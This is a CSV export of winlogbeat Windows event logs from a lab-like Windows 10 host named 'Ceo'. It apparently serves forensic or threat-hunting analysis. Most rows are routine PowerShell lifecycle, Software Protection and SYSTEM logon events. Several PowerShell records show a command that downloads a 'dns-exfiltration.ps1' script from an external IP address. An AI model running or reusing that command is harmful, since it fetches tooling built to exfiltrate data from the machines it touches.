	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4583,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.312",aXkSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4584,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.693",vHkRBIQByII7dpeEmRo0,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 16:59:33.500","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=5.1.19041.1682
	RunspaceId=4302163e-aa08-4bab-a65b-07d1cfa694ce
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=5.1.19041.1682
	RunspaceId=4302163e-aa08-4bab-a65b-07d1cfa694ce
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4578,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.132",unkRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 16:59:32.484","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=5.1.19041.1682
	RunspaceId=4302163e-aa08-4bab-a65b-07d1cfa694ce
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=5.1.19041.1682
	RunspaceId=4302163e-aa08-4bab-a65b-07d1cfa694ce
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4577,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.068",uHkRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:32.484","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4575,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.068",uXkRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:32.484","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4576,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.052",t3kRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:32.484","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4574,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.037",tHkRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:32.481","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4571,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.037",tXkRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:32.484","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4572,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:32.037",tnkRBIQByII7dpeElRom,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:32.484","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a47a9f1e-ced7-4cf9-8c3f-a4d11067f084
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4573,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:57:53.217",JnkQBIQByII7dpeEFBjB,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:57:54.129","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:58:53Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:58:53Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3915,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:57:14.631",KXkPBIQByII7dpeEgRft,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:57:16.547","Oct 23, 2022 @ 16:57:16.012",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"5,416","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28787,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:57:14.631",KnkPBIQByII7dpeEgRft,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:57:16.547","Oct 23, 2022 @ 16:57:16.013",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"5,416","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28788,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:57:14.609",KHkPBIQByII7dpeEfRfh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:57:15.542","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3914,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:56:38.267",SHkOBIQByII7dpeE7haa,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:56:38.873","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:58:38Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:58:38Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3913,"-","-","-","-","-","-"
